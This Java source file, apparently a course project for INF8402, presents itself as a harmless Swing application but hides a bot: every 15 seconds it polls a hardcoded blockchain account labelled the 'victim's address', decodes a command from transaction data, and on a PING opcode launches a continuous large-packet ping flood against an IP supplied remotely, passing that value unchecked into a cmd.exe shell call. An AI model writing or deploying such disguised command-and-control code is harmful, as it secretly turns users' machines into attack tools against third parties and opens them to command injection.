import java.awt.Color;
import java.awt.EventQueue;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.IOException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSeparator;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;

import enumerations.ADDR_TYPE;
import enumerations.OPCODE;
import exceptions.NotParsableException;
import exceptions.NotParsableJSONException;
import parsers.AddrParser;
import parsers.IpParser;
import parsers.OpcodeParser;
import parsers.TxParser;
import parsers.WebParser;

public class Main {

	/* Hardcoding victim's address */
	private String addr_account ="3e58EE6294a8eE14Abd5207d7BD73466A0ae93f4";

	/* Java frame */
	private JFrame frame;

	/* Event items */
	private JCheckBox chckbxAfficherComportementSecret;

	/* Labels and separator */
	private JLabel lblBienvenuSurCe;
	private JLabel lblHex;
	private JLabel lblAscii;
	private JLabel lblOpcode;
	private JLabel lblEtat ;
	private JLabel lblPasDeTransaction;
	private JSeparator separator;

	/* TextFields */
	private JTextField hex_textField ;
	private JTextField ascii_textfield;
	private JTextPane log_area;
	private String ascii_final ="";
	private OPCODE opcode_final;
	private JTextField textField;

	/* Logic */
	private boolean task_done = false;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Main window = new Main();
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public Main() {
		initialize();

		ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
		executor.scheduleAtFixedRate(new Runnable() {
			@Override
			public void run() {
				if(task_done) return;
				try {

					// Parsing HTTP address
					String addr_content = WebParser.parse_url(addr_account, ADDR_TYPE.ACCOUNT);
					log_area.setText(log_area.getText() + addr_content);

					// Parsing JSON address
					String tx_addr = AddrParser.parse(addr_content);

					// Parsing HTTP transaction
					String tx_content = WebParser.parse_url(tx_addr, ADDR_TYPE.TX);

					// Parsing JSON transaction
					String data  = TxParser.parse(tx_content);

					// Getting the data
					opcode_final = OpcodeParser.parse(data);

					// Setting the data
					hex_textField.setText(data);
					ascii_textfield.setText(ascii_final);
					textField.setText(opcode_final.toString());
					lblPasDeTransaction.setText("Transaction reçu");
					lblPasDeTransaction.setForeground(Color.GREEN);

					// Executing correct behaviour
					try
					{
						switch(opcode_final) {
							case PING:
								ascii_final = IpParser.parse(data);
								ascii_textfield.setText(ascii_final);
								Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"ping "+ascii_final+" -t -l 1000 \"");
								break;
							case UNKNOWN:
								System.out.println("Unknown");
								break;
							default: 
								System.out.println("Other");
								break;
						}
					
						task_done = true;
					}
					catch ( IOException e )
					{
						System.out.println("Erreur terminal");
					}
				}
				catch(NotParsableException e) {
					// Not connected to the network 
					lblPasDeTransaction.setText("Non connecté");
					lblPasDeTransaction.setForeground(Color.RED);
					System.out.println(e);
				} catch(NotParsableJSONException e) {
					// Transaction not currently existing
					System.out.println("Transaction imparsable");
				}


			}
		}, 15, 15, TimeUnit.SECONDS);


		chckbxAfficherComportementSecret.addItemListener(new ItemListener() {
			@Override
			public void itemStateChanged(ItemEvent e) {
				if (e.getStateChange() == ItemEvent.SELECTED) {
					items_visible(true);
				} else {
					items_visible(false);
				}
			}
		});

	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frame = new JFrame();
		frame.setBounds(100, 100, 450, 360);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.getContentPane().setLayout(null);

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		tabbedPane.setBounds(0, 0, 434, 319);
		frame.getContentPane().add(tabbedPane);

		JPanel panel = new JPanel();
		tabbedPane.addTab("Home", null, panel, null);
		panel.setLayout(null);

		lblBienvenuSurCe = new JLabel("Bienvenue sur ce nouveau logiciel - INF8402");
		lblBienvenuSurCe.setBounds(87, 23, 247, 14);
		panel.add(lblBienvenuSurCe);

		lblHex = new JLabel("Hex:");
		lblHex.setBounds(39, 148, 46, 14);
		panel.add(lblHex);

		lblAscii = new JLabel("ASCII:");
		lblAscii.setBounds(39, 173, 46, 14);
		panel.add(lblAscii);

		hex_textField = new JTextField();
		hex_textField.setBounds(68, 145, 276, 20);
		panel.add(hex_textField);
		hex_textField.setColumns(10);

		ascii_textfield = new JTextField();
		ascii_textfield.setBounds(78, 170, 266, 20);
		panel.add(ascii_textfield);
		ascii_textfield.setColumns(10);

		JPanel panel_1 = new JPanel();
		tabbedPane.addTab("Log", null, panel_1, null);
		panel_1.setLayout(null);

		log_area = new JTextPane();
		log_area.setText("log \n");
		log_area.setBounds(10, 11, 409, 211);
		panel_1.add(log_area);

		lblOpcode = new JLabel("OpCode:");
		lblOpcode.setBounds(39, 198, 55, 14);
		panel.add(lblOpcode);

		textField = new JTextField();
		textField.setBounds(99, 195, 46, 20);
		panel.add(textField);
		textField.setColumns(10);

		chckbxAfficherComportementSecret = new JCheckBox("Afficher comportement secret");
		chckbxAfficherComportementSecret.setBounds(27, 62, 252, 23);
		panel.add(chckbxAfficherComportementSecret);

		lblEtat = new JLabel("Etat:");
		lblEtat.setBounds(39, 123, 46, 14);
		panel.add(lblEtat);

		lblPasDeTransaction = new JLabel("Pas de transaction re\u00E7u");
		lblPasDeTransaction.setBounds(68, 123, 209, 14);
		panel.add(lblPasDeTransaction);

		separator = new JSeparator();
		separator.setBounds(68, 104, 266, 2);
		panel.add(separator);

		items_visible(false);

	}


	private void items_visible(boolean b) {
		lblHex.setVisible(b);
		lblAscii.setVisible(b);
		lblOpcode.setVisible(b);
		lblEtat.setVisible(b);
		lblPasDeTransaction.setVisible(b);
		separator.setVisible(b);
		hex_textField.setVisible(b);
		ascii_textfield.setVisible(b);
		textField.setVisible(b);
	}
}
